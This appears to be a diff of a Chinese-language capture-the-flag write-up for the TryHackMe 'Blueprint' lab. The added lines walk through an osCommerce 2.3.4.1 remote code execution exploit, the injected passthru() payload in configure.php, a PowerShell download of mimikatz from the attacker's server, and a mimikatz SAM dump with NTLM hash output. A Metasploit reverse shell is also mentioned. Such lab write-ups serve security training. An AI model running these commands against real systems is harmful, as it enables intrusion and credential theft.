@@ -180,12 +180,15 @@ smb: \Default\> dir
                 7863807 blocks of size 4096. 4762008 blocks available
 ```
 
-### searchsploit
+## initial acces - osCommerce 2.3.4.1 - Remote Code Execution
 
-發現 8080 用 oscommerce-2.3.4
+感謝[大神](https://diecknet.de/en/2024/09/24/tryhackme-blueprint/)分享 
+
+### searchsploit
+確認版本漏洞
 ```bash
 ┌──(kali㉿kali)-[~/tryhackme/blueprint]
-└─$ searchsploit oscommerce 2.3.4 
+└─$ searchsploit oscommerce 2.3.4        
 --------------------------------------------------------- ---------------------------------
  Exploit Title                                           |  Path
 --------------------------------------------------------- ---------------------------------
@@ -199,58 +202,183 @@ osCommerce 2.3.4.1 - Remote Code Execution               | php/webapps/44374.py
 osCommerce 2.3.4.1 - Remote Code Execution (2)           | php/webapps/50128.py
 --------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-
 ```
-找到很多漏洞嘗試利用
-疑似有拿到 shell  
-但都沒辦法移動路徑  
-也沒辦法上傳檔案QQ  
-不知道為什麼
-```bash
+
+利用 `php/webapps/50128.py`  或參考 [exploit.py](exploit.py)
+確認該 POC 路徑
+```bash                   
 ┌──(kali㉿kali)-[~/tryhackme/blueprint]
-└─$ python3 50128.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
+└─$ searchsploit 50128 -p        
+  Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2)
+      URL: https://www.exploit-db.com/exploits/50128
+     Path: /usr/share/exploitdb/exploits/php/webapps/50128.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied EDB-ID #50128's path to the clipboard
+```
+> 為什麼要加 DIR_FS_DOCUMENT_ROOT 可參考 [說明](QA-document-root.md)  
+> 為什麼用 pssthru 可參考 [說明](QA-passthru.md)
+
+
+#### get system user
+使用 POC  
+發現取得 system 權限
+```bash          
+┌──(kali㉿kali)-[~/tryhackme/blueprint]
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
 [*] Install directory still available, the host likely vulnerable to the exploit.
 [*] Testing injecting system command to test vulnerability
 User: nt authority\system
 
 RCE_SHELL$ whoami
 nt authority\system
-
-RCE_SHELL$ pwd
-
-RCE_SHELL$ dir -force
- Volume in drive C has no label.
- Volume Serial Number is 14AF-C52C
-
- Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
-
-
-RCE_SHELL$ cd C:\Users\Administrator
-
-RCE_SHELL$ dir
- Volume in drive C has no label.
- Volume Serial Number is 14AF-C52C
-
- Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
-
-11/08/2025  08:03 AM    <DIR>          .
-11/08/2025  08:03 AM    <DIR>          ..
-04/11/2019  09:52 PM               447 application.php
-11/08/2025  08:04 AM             1,118 configure.php
-04/11/2019  09:52 PM    <DIR>          functions
-               2 File(s)          1,565 bytes
-               3 Dir(s)  19,509,276,672 bytes free
-
-RCE_SHELL$ cd C:\
-RCE_SHELL$ dir
- Volume in drive C has no label.
- Volume Serial Number is 14AF-C52C
-
- Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
 ```
 
-## initial access
-最後還是依靠大神
+可以發現 `\install\includes` 多了 configure.php
+POC 中改的 passthru 成功執行
+```bash
+RCE_SHELL$ dir
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+
+11/09/2025  01:56 AM    <DIR>          .
+11/09/2025  01:56 AM    <DIR>          ..
+04/11/2019  09:52 PM               447 application.php
+11/09/2025  01:56 AM             1,118 configure.php
+04/11/2019  09:52 PM    <DIR>          functions
+               2 File(s)          1,565 bytes
+               3 Dir(s)  19,505,577,984 bytes free
+
+RCE_SHELL$ more configure.php
+<?php
+  define('HTTP_SERVER', '://');
+  define('HTTPS_SERVER', '://');
+  define('ENABLE_SSL', false);
+  define('HTTP_COOKIE_DOMAIN', '');
+  define('HTTPS_COOKIE_DOMAIN', '');
+  define('HTTP_COOKIE_PATH', '/');
+  define('HTTPS_COOKIE_PATH', '/');
+  define('DIR_WS_HTTP_CATALOG', '/');
+  define('DIR_WS_HTTPS_CATALOG', '/');
+  define('DIR_WS_IMAGES', 'images/');
+  define('DIR_WS_ICONS', DIR_WS_IMAGES . 'icons/');
+  define('DIR_WS_INCLUDES', 'includes/');
+  define('DIR_WS_FUNCTIONS', DIR_WS_INCLUDES . 'functions/');
+  define('DIR_WS_CLASSES', DIR_WS_INCLUDES . 'classes/');
+  define('DIR_WS_MODULES', DIR_WS_INCLUDES . 'modules/');
+  define('DIR_WS_LANGUAGES', DIR_WS_INCLUDES . 'languages/');
+
+  define('DIR_WS_DOWNLOAD_PUBLIC', 'pub/');
+  define('DIR_FS_CATALOG', './');
+  define('DIR_FS_DOWNLOAD', DIR_FS_CATALOG . 'download/');
+  define('DIR_FS_DOWNLOAD_PUBLIC', DIR_FS_CATALOG . 'pub/');
+
+  define('DB_SERVER', '');
+  define('DB_SERVER_USERNAME', '');
+  define('DB_SERVER_PASSWORD', '');
+  define('DB_DATABASE', '');passthru('more configure.php');/*');
+  define('USE_PCONNECT', 'false');
+  define('STORE_SESSIONS', 'mysql');
+?>
+```
+
+#### get root.txt
+```bash
+RCE_SHELL$ dir C:\Users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/27/2019  06:15 PM    <DIR>          .
+11/27/2019  06:15 PM    <DIR>          ..
+11/27/2019  06:15 PM                37 root.txt.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  19,505,577,984 bytes free
+
+RCE_SHELL$ more C:\Users\Administrator\Desktop\root.txt.txt
+THM{...}
+```
+
+### mimikatz
+
+本機取得 [mimikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master/Win32)  
+開啟 http.server
+```bash
+┌──(kali㉿kali)-[~/tools]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.87.118 - - [09/Nov/2025 10:08:50] "GET /mimikatz.exe HTTP/1.1" 200 -
+```
+
+靶機下載 mimikatz.exe 檔案
+```bash
+RCE_SHELL$ powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.4.11.38:1234/mimikatz.exe\", \"mimikatz.exe\")
+<br />
+<b>Fatal error</b>:  Maximum execution time of 30 seconds exceeded in <b>C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php</b> on line <b>30</b><br />
+```
+
+雖然下載過程有顯示 error
+但看檔案容量是正確的就不管了
+```bash
+RCE_SHELL$ dir
+ Volume in drive C has no label.
+ Volume Serial Number is 14AF-C52C
+
+ Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+
+11/09/2025  02:08 AM    <DIR>          .
+11/09/2025  02:08 AM    <DIR>          ..
+04/11/2019  09:52 PM               447 application.php
+11/09/2025  02:08 AM             1,118 configure.php
+04/11/2019  09:52 PM    <DIR>          functions
+11/09/2025  02:08 AM           995,080 mimikatz.exe
+               3 File(s)        996,645 bytes
+               3 Dir(s)  19,508,334,592 bytes free
+
+```
+
+#### get ntlm
+執行 mimikatz  
+成功取得 ntlm
+```bash
+RCE_SHELL$ mimikatz "lsadump::sam" exit
+
+  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::sam
+Domain : BLUEPRINT
+SysKey : 147a48de4a9815d2aa479598592b086f
+Local SID : S-1-5-21-3130159037-241736515-3168549210
+
+SAMKey : 3700ddba8f7165462130a4441ef47500
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 5...1
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : Lab
+  Hash NTLM: 3...0
+
+mimikatz(commandline) # exit
+Bye!
+```
+> 可用[ntlm.pw](https://ntlm.pw)解碼 
+
+## initial access - multi/http/oscommerce_installer_unauth_code_exec
+使用 metasploit
 ### msfconsle
 ```bash
 msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options
@@ -294,7 +422,7 @@ Server username: SYSTEM
 
 成功取得 user meterpreter
 
-## Privilege Escalation
+### Privilege Escalation
 嘗試提權
 製作一個 反射 .exe
 > 要注意是 windows/meterpreter/reverse_tcp 不是 x64 
